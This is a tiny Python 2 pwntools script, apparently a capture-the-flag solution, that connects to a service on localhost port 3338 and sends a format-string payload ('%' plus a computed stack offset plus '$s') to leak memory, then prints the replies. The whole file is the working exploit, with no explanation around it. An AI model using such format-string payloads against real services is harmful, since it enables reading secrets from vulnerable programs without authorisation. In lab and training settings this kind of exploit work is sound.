#!/usr/bin/python2

from pwn import *


IP = "localhost"


r = remote(IP, 3338)

r.recvline()
r.recvline()
r.sendline("%" +str(6+(0x230-0x220)/8)+ "$s")
print r.recvline()
print r.recvline()
print r.recvline()
